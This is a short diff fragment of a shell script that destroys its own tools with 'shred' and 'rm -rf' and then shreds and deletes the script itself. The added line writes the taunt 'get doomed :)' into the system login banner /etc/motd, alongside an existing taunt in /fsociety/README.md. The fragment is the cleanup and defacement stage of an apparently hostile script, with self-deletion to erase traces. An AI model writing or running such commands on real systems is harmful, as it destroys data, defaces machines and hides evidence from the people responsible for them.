@@ -16,5 +16,6 @@ shred -n 1 -z ./tools/core_deleter
 rm -rf ./tools/
 
 echo "get doomed :)" >>/fsociety/README.md
+echo "get doomed :)" >>/etc/motd
 
 shred -n 1 -z "$0" && rm "$0"
